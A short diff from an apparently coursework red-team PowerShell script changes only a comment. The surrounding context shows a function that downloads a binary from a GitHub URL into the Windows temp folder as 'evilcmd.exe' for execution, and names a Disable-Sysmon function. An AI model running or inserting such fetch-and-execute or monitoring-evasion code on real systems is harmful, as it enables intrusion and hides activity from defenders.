@@ -343,7 +343,7 @@ Function Disable-Sysmon
 #Function that downloads and executes a binary application - currently downloads calc.exe from my github
 Function Download-ExecuteBinary
 {
-	#downloads calc.exe from my github account
+	#downloads cmd.exe from my github account
 	invoke-webrequest -uri "https://github.com/robertriskin/csc842/blob/master/Module%202%20-%20RedTeam-SysInfo-V2/bin/cmd.exe?raw=true" -outfile "c:\windows\temp\evilcmd.exe"
 	
 	#executes the downloaded cmd.exe
